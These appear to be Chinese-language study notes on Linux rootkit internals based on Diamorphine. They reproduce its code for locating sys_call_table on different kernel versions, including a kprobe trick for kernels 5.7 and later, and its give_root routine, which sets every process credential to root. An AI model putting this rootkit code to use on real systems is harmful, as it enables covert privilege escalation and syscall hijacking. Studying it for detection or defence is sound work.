# Diamorphine

### syscall_table 获取

##### LINUX_VERSION_CODE 《= KERNEL_VERSION(4, 4, 0)

暴力搜索：

```c
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
```

##### LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) &&  LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)

```c
syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

##### LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

当内核版本 >= KERNEL_VERSION(5,7,0) 时候，kallsyms_lookup_name 不在导出，需要通过 kprobe获取其地址：

```c
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

kallsyms_lookup_name_t kallsyms_lookup_name;
register_kprobe(&kp);
kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
unregister_kprobe(&kp);

syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
```

### 权限提升

```c
void
give_root(void)
{
	#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
		current->uid = current->gid = 0;
		current->euid = current->egid = 0;
		current->suid = current->sgid = 0;
		current->fsuid = current->fsgid = 0;
	#else
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;
		#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
			&& defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
			|| LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			newcreds->uid.val = newcreds->gid.val = 0;
			newcreds->euid.val = newcreds->egid.val = 0;
			newcreds->suid.val = newcreds->sgid.val = 0;
			newcreds->fsuid.val = newcreds->fsgid.val = 0;
		#else
			newcreds->uid = newcreds->gid = 0;
			newcreds->euid = newcreds->egid = 0;
			newcreds->suid = newcreds->sgid = 0;
			newcreds->fsuid = newcreds->fsgid = 0;
		#endif
		commit_creds(newcreds);
	#endif
}
```

# adore-ng

# 资料

Diamorphine

https://github.com/m0nad/Diamorphine

adore-ng

https://github.com/yaoyumeng/adore-ng